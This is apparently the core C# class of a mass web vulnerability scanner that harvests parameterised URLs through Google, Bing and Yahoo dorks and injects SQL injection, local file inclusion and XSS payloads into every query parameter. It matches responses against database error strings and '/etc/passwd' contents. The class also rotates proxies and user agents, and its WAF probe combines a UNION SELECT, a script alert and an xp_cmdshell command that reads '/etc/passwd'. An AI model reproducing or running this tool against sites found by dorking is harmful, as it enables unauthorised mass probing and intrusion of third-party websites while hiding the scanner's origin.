using Leaf.xNet;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace APSoft_Web_Scanner_v2
{
    public class core : IDisposable
    {
        #region property

        [JsonIgnore]
        public MainForm main { get; set; }

        [JsonIgnore]
        public List<string> dorksgeneratedlist = new List<string>();

        [JsonIgnore]
        public List<string> dorksconfigurationlist = new List<string>();

        [JsonIgnore]
        public List<string> dorkskeywordlist = new List<string>();

        [JsonIgnore]
        public string logpath { get; set; }

        [JsonRequired]
        public string urlregex { get; set; }

        [JsonRequired]
        public int connectiontimeout { get; set; }

        [JsonRequired]
        public int threadscount { get; set; }

        [JsonRequired]
        public bool randomuseragent { get; set; }

        [JsonRequired]
        public string customuseragent { get; set; }

        [JsonRequired]
        public int scannermaxpayloadchecking { get; set; }

        [JsonRequired]
        public int grabbermaxsearchdepth { get; set; }

        [JsonRequired]
        public bool continueifwafdetected { get; set; }

        [JsonRequired]
        public bool useproxy { get; set; }

        [JsonRequired]
        public string proxyloadurl { get; set; }

        [JsonRequired]
        public bool proxyautoupdate { get; set; }

        [JsonRequired]
        public int proxyautoupdateinterval { get; set; }

        [JsonRequired]
        public string proxytype { get; set; }

        [JsonIgnore]
        public vulnerpayloads paylodasinstance { get; set; }

        [JsonIgnore]
        public vulnererrors payloadserrorsinstance { get; set; }

        [JsonIgnore]
        public List<string> proxylist = new List<string>();

        [JsonRequired]
        private string proxyregex { get; set; }

        [JsonIgnore]
        public List<isearcher> searcherslist { get; set; }

        [JsonIgnore]
        public List<string> urlslist = new List<string>();

        [JsonIgnore]
        public statistics stats { get; set; }

        [JsonRequired]
        public bool scannersrealltimeupdate { get; set; }

        [JsonIgnore]
        public List<iscanner> scannerslist { get; set; }

        [JsonIgnore]
        public bool scannerbothisactive { get; set; }

        [JsonIgnore]
        public CancellationTokenSource stopsource { get; set; }

        #endregion property

        public core()
        {
            logpath = createdirectorytree(new string[]
            {
                "result",
                DateTime.Now.ToString("yyyy-MM-dd H-m")
            });
            urlregex = "";
            if (File.Exists("payloads.json"))
            {
                string source = File.ReadAllText("payloads.json");
                if (source.Contains("sql") && source.Contains("lfi") && source.Contains("xss"))
                {
                    paylodasinstance = JsonConvert.DeserializeObject<vulnerpayloads>(File.ReadAllText("payloads.json"));
                }
                else
                {
                    paylodasinstance = new vulnerpayloads()
                    {
                        sql = new List<string>() { "'" },
                        lfi = new List<string>() { "etc/passwd" },
                        xss = new List<string>() { "<script>alert('hi');</script>" }
                    };
                    File.WriteAllText("payloads.json", JsonConvert.SerializeObject(paylodasinstance, Formatting.Indented));
                }
            }
            else
            {
                paylodasinstance = new vulnerpayloads()
                {
                    sql = new List<string>() { "'" },
                    lfi = new List<string>() { "etc/passwd" },
                    xss = new List<string>() { "<script>alert('hi');</script>" }
                };
                File.WriteAllText("payloads.json", JsonConvert.SerializeObject(paylodasinstance, Formatting.Indented));
            }

            if (File.Exists("payloadserror.json"))
            {
                string source = File.ReadAllText("payloadserror.json");
                if (source.Contains("sql") && source.Contains("lfi") && source.Contains("xss"))
                {
                    payloadserrorsinstance = JsonConvert.DeserializeObject<vulnererrors>(File.ReadAllText("payloadserror.json"));
                }
                else
                {
                    payloadserrorsinstance = new vulnererrors()
                    {
                        sql = new List<string>() { "REIT|SQL (warning|error|syntax)", "warning: mysql_connect()", "warning: mysql_fetch_row()", "error in your sql syntax", "warning: mysql_result()", "mysql_num_rows()", "mysql_fetch_assoc()", "mysql_fetch_row()", "mysql_numrows()", "mysql_fetch_object()", "MySQL Driver", "MySQL ODBC", "MySQL Error", "error in your SQL syntax" },
                        lfi = new List<string>() { "root:" },
                        xss = new List<string>() { "REIT|PH09NIXPY74X<svg" }
                    };
                    File.WriteAllText("payloadserror.json", JsonConvert.SerializeObject(payloadserrorsinstance, Formatting.Indented));
                }
            }
            else
            {
                payloadserrorsinstance = new vulnererrors()
                {
                    sql = new List<string>() { "REIT|SQL (warning|error|syntax)", "warning: mysql_connect()", "warning: mysql_fetch_row()", "error in your sql syntax", "warning: mysql_result()", "mysql_num_rows()", "mysql_fetch_assoc()", "mysql_fetch_row()", "mysql_numrows()", "mysql_fetch_object()", "MySQL Driver", "MySQL ODBC", "MySQL Error", "error in your SQL syntax" },
                    lfi = new List<string>() { "root:" },
                    xss = new List<string>() { "REIT|PH09NIXPY74X<svg" }
                };
                File.WriteAllText("payloadserror.json", JsonConvert.SerializeObject(payloadserrorsinstance, Formatting.Indented));
            }

            connectiontimeout = 20;
            threadscount = 1;
            randomuseragent = false;
            customuseragent = "";
            scannermaxpayloadchecking = 1;
            grabbermaxsearchdepth = 1;
            continueifwafdetected = true;
            useproxy = false;
            proxyloadurl = "";
            proxyautoupdate = false;
            proxyautoupdateinterval = 1;
            proxytype = "socks4";
            proxyregex = @"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}:\d{1,5}";
            urlslist = new List<string>();
            stats = new statistics();
            scannersrealltimeupdate = false;
            scannerbothisactive = false;
            searcherslist = new List<isearcher>()
            {
                new googlesearcher(),
                new bingsearcher(),
                new yahoosearcher()
            };
            scannerslist = new List<iscanner>()
            {
                new sqlscanner(),
                new xssscanner(),
                new lfiscanner()
            };

        }

        public void searcherupdateview()
        {
            Task.Factory.StartNew(() =>
            {
                Stopwatch searcherwatcher = new Stopwatch();
                searcherwatcher.Start();
                while (true)
                {
                    if (stopsource.IsCancellationRequested)
                    {
                        break;
                    }
                    try
                    {
                        string timestr = string.Format("{0:00} : {1:00} : {2:00}", searcherwatcher.Elapsed.Hours, searcherwatcher.Elapsed.Minutes, searcherwatcher.Elapsed.Seconds);
                        main.label45.Text = $"Elapsed time : {timestr}";
                        main.label22.Text = stats.google.ToString();
                        main.label23.Text = stats.bing.ToString();
                        main.label29.Text = stats.searchererror.ToString();
                        main.label27.Text = (stats.yahoo + stats.bing + stats.google).ToString();
                        main.label25.Text = stats.yahoo.ToString();
                        Thread.Sleep(1000);
                    }
                    catch
                    {
                    }
                }
            });
        }

        public void scannerupdateview()
        {
            Task.Factory.StartNew(() =>
            {
                Stopwatch searcherwatcher = new Stopwatch();
                searcherwatcher.Start();
                while (true)
                {
                    if (stopsource.IsCancellationRequested)
                    {
                        break;
                    }
                    try
                    {
                        string timestr = string.Format("{0:00} : {1:00} : {2:00}", searcherwatcher.Elapsed.Hours, searcherwatcher.Elapsed.Minutes, searcherwatcher.Elapsed.Seconds);
                        main.label46.Text = $"Elapsed time : {timestr}";
                        main.label43.Text = stats.scannerscanned.ToString();
                        main.label31.Text = stats.sqlvulnerable.ToString();
                        main.label47.Text = stats.scannererror.ToString();
                        main.label39.Text = stats.scannerwafdetected.ToString();
                        main.label37.Text = stats.xssvulnerable.ToString();
                        main.label41.Text = stats.lfivulnerable.ToString();
                        Thread.Sleep(1000);
                    }
                    catch
                    {
                    }
                }
            });
        }

        public async Task searchersstart()
        {
            try
            {
                searcherupdateview();
                int eachsearcher = threadscount / searcherslist.Count;
                searcherslist.ForEach(func =>
                {
                    func.helper = this;
                });
                List<Task> tklist = new List<Task>();
                for (int i = 0; i < searcherslist.Count; i++)
                {
                    tklist.AddRange(searcherslist[i].initialize(eachsearcher, dorksgeneratedlist, stopsource.Token));
                }
                await Task.WhenAll(tklist);
                searcherslist.ForEach(func => func.Dispose());
                this.Dispose();
                scannerbothisactive = false;
            }
            catch (Exception E)
            {
                MessageBox.Show(E.Message);
            }
        }

        public async Task scannerstart()
        {
            try
            {
                scannerupdateview();
                scannerslist.ForEach(func =>
                {
                    func.helper = this;
                });
                int eachcount = threadscount / scannerslist.Count;
                List<Task> tklist = new List<Task>();
                for (int i = 0; i < scannerslist.Count; i++)
                {
                    tklist.AddRange(scannerslist[i].initialize(eachcount, scannersrealltimeupdate, stopsource.Token));
                }
                await Task.WhenAll(tklist);
                MessageBox.Show("we are finished");
            }
            catch (Exception E)
            {
                MessageBox.Show(E.Message);
            }
        }

        public void Dispose()
        {
            GC.Collect();
            GC.SuppressFinalize(this);
        }

        public void loadlist(ref List<string> targetlist, string title)
        {
            using (OpenFileDialog dialog = new OpenFileDialog())
            {
                dialog.Multiselect = false;
                dialog.Filter = "Text files|*.txt";
                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    targetlist.AddRange(File.ReadAllLines(dialog.FileName));
                }
            }
        }

        public string createdirectorytree(string[] items)
        {
            return items.Aggregate((a, b) =>
             {
                 var dir = a + "\\" + b;
                 if (!Directory.Exists(dir))
                     Directory.CreateDirectory(dir);
                 return dir;
             });
        }

        public void loadproxyfromurl()
        {
            try
            {
                HttpRequest req = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    AllowAutoRedirect = true,
                    KeepAlive = false,
                    ConnectTimeout = connectiontimeout * 1000,
                    ReadWriteTimeout = (connectiontimeout - 2) * 1000,
                    Cookies = new CookieStorage(false),
                    SslProtocols =
                         System.Security.Authentication.SslProtocols.Tls |
                         System.Security.Authentication.SslProtocols.Tls11 |
                         System.Security.Authentication.SslProtocols.Tls12,
                    UserAgent = getuseragent()
                };
                string source = req.Get(this.proxyloadurl).ToString();
                if (source.Length > 0)
                {
                    List<string> proxies = new Regex(this.proxyregex)
                            .Matches(source)
                            .Cast<Match>()
                            .ToList()
                            .Where(func => func.Length > 5)
                            .Select(func => func.Value.ToString())
                            .Distinct()
                            .ToList();
                    this.proxylist.AddRange(proxies);
                }
            }
            catch
            {
            }
        }

        public string getuseragent()
        {
            if (this.randomuseragent)
            {
                return Leaf.xNet.Http.RandomUserAgent();
            }
            else
            {
                if (this.customuseragent.Length > 0)
                {
                    return this.customuseragent;
                }
                else
                {
                    return Leaf.xNet.Http.ChromeUserAgent();
                }
            }
        }

        public void setproxy(ref HttpRequest req)
        {
            if (this.useproxy)
            {
                if (proxylist.Count > 0)
                {
                    string proxy = proxylist[new Random().Next(0, proxylist.Count - 1)];
                    if (proxy.Length <= 0) return;
                    switch (proxytype)
                    {
                        case "socks4":
                            req.Proxy = ProxyClient.Parse(ProxyType.Socks4, proxy);
                            break;

                        case "socks5":
                            req.Proxy = ProxyClient.Parse(ProxyType.Socks5, proxy);
                            break;

                        case "http":
                            req.Proxy = ProxyClient.Parse(ProxyType.HTTP, proxy);
                            break;
                    }
                }
            }
        }

        public bool urlfilter(string url)
        {
            if (!Uri.IsWellFormedUriString(url, UriKind.Absolute))
            {
                return false;
            }
            if (urlregex.Length > 0)
            {
                if (!Regex.IsMatch(url, urlregex))
                {
                    return false;
                }
            }
            try
            {
                var uri = new Uri(url);
                if (uri.Query.Length <= 1)
                {
                    return false;
                }
            }
            catch { }
            return true;
        }

        public List<string> injectpayload(string url, string payload, bool removevalues = false)
        {
            List<string> res = new List<string>();
            if (Uri.IsWellFormedUriString(url, UriKind.Absolute))
            {
                Uri uriinstance = new Uri(url);
                string query = uriinstance.Query;
                if (query.Length > 1)
                {
                    NameValueCollection paramslist = System.Web.HttpUtility.ParseQueryString(query, Encoding.UTF8);
                    for (int i = 0; i < paramslist.Keys.Count; i++)
                    {
                        string item = paramslist.Keys[i];
                        var newparamslist = paramslist;
                        string newurl = url;
                        if (removevalues)
                            newparamslist[item] = payload;
                        else
                            newparamslist[item] = newparamslist[item] + payload;
                        newurl = newurl.Replace(query, newparamslist.ToString());
                        res.Add(newurl);
                    }
                }
            }
            return res;
        }

        public bool scannerwafdetection(string url)
        {
            bool res = false;
            try
            {
                string detectionpayload = " AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#";
                HttpRequest req = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    IgnoreInvalidCookie = true,
                    KeepAlive = true,
                    ConnectTimeout = connectiontimeout * 1000,
                    ReadWriteTimeout = (connectiontimeout - 2) * 1000,
                    Cookies = new CookieStorage(false),
                    UserAgent = getuseragent(),
                    AllowAutoRedirect = true
                };
                setproxy(ref req);
                string source = req.Get(url, null).ToString();
                req.ClearAllHeaders();
                req.Cookies = req.Response.Cookies;
                foreach (var item in injectpayload(url, detectionpayload))
                {
                    req.Get(item);
                    string newsource = req.Response.ToString();
                    if (newsource.Length <= 50 || req.Response.StatusCode.ToString() != "OK")
                    {
                        res = true;
                    }
                }
                if (source.ToLower().Contains("protected by"))
                {
                    res = true;
                }
            }
            catch
            {
                Interlocked.Increment(ref stats.scannererror);
            }
            return res;
        }

        #region dork setting

        public void filterdorksconfigurations()
        {
            // removing duplicates , and invalid lines
            this.dorksconfigurationlist = dorksconfigurationlist
                  .Where(func => func.Contains("{DORK}"))
                  .Distinct()
                  .ToList();
        }

        public void filterdorkskeywords()
        {
            // removing duplicates
            this.dorkskeywordlist = dorkskeywordlist
                .Distinct()
                .ToList();
        }

        #endregion dork setting
    }
}